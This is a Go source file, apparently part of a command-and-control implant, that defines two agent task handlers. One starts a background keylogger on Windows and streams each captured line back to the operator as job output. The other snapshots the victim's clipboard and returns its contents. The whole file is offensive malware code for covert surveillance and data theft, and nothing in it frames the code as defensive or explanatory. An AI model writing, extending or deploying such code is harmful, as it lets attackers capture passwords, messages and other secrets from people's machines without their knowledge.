package commands

import (
	"context"
	"encoding/json"
	"strings"
)

// execKeylogCmd starts an asynchronous keylogger job (Windows only). args:
// {"interval_ms":100}
func (d *Dispatcher) execKeylogCmd(_ *Dispatcher, task *Task) *Result {
	var args struct {
		IntervalMS int `json:"interval_ms"`
	}
	_ = json.Unmarshal([]byte(task.Args), &args)
	if args.IntervalMS <= 0 {
		args.IntervalMS = 100
	}
	return d.startJob("keylog", task, func(ctx context.Context) []Result {
		var out []Result
		err := keylogStart(ctx, args.IntervalMS, func(line string) {
			out = append(out, Result{TaskID: task.ID, Output: line, Status: protocolTaskJobOutput()})
		})
		if err != nil {
			out = append(out, Result{TaskID: task.ID, Output: "keylog failed: " + err.Error(), Status: protocolTaskFailed()})
			return out
		}
		out = append(out, Result{TaskID: task.ID, Output: "keylog stopped", Status: protocolTaskCompleted()})
		return out
	})
}

// execClipboardCmd reads the current clipboard content (snapshot).
func (d *Dispatcher) execClipboardCmd(_ *Dispatcher, task *Task) *Result {
	text, err := clipboardRead()
	if err != nil {
		return d.finish(task, "clipboard failed: "+err.Error(), "failed")
	}
	text = strings.TrimSpace(text)
	if text == "" {
		text = "(empty clipboard)"
	}
	return d.finish(task, text, "")
}
